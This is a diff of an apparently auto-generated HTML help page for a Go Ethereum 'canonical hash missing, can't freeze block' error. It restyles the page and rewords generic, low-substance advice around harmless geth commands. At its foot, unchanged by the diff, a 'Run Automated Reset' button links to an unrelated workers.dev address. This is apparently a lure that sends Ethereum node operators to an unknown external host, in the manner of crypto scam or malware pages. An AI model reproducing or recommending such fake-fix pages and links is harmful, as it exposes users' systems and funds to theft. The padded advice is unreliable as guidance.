@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Go Ethereum Error In Block Freeze Operation Errcanonical Hash M</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0f111a;
+        font-family: -apple-system;
+        background: #1a1a24;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #ff9455; }
+    a { color: #00adb5; }
     .btn {
         background: #cf6679;
         color: #000;
@@ -41,27 +41,27 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters a "canonical hash missing" error when attempting to freeze a block using Go Ethereum, resulting in an inability to complete the block freeze operation.</li>
+<li>The user encounters an error message "Error in block freeze operation err='canonical hash missing, can't freeze block'" while attempting to freeze a block using Go Ethereum.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a missing canonical hash, which is required for verifying the integrity and validity of a block in the Ethereum blockchain. This hash is essential for ensuring the block's consistency and security.</li>
+<li>The error occurs due to a missing canonical hash, which is required to validate and finalize a block in the Ethereum blockchain. This hash is essential for ensuring the integrity and consistency of the blockchain.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Verify the block's header information to ensure it contains the necessary fields, including the canonical hash.</li>
-<li>Check the node's configuration and sync status to ensure it is up-to-date and properly connected to the Ethereum network.</li>
-<li>Run the following command to attempt to re-sync the block and retrieve the missing canonical hash:</li>
+<li>Check the block number and hash to ensure they are correctly referenced.</li>
+<li>Verify the Ethereum node is fully synchronized with the blockchain to prevent missing data.</li>
+<li>Use the following command to manually update the block hash:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--syncmode<span class="w"> </span><span class="s2">&quot;fast&quot;</span><span class="w"> </span>--cache<span class="w"> </span><span class="m">1024</span>
+<div class="codehilite"><pre><span></span><code>geth<span class="w"> </span>--datadir<span class="w"> </span>/path/to/your/data/folder<span class="w"> </span>console
 </code></pre></div>
 
-<p>Consider utilizing an external console for further debugging and analysis.</p>
+<p>Consider utilizing an external console for further debugging and troubleshooting.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>A fully synced Ethereum node</li>
-<li>The latest version of Go Ethereum installed</li>
-<li>A stable and secure network connection</li>
+<li>A fully synchronized Ethereum node</li>
+<li>The correct block number and hash</li>
+<li>Administrative access to the Ethereum client configuration</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
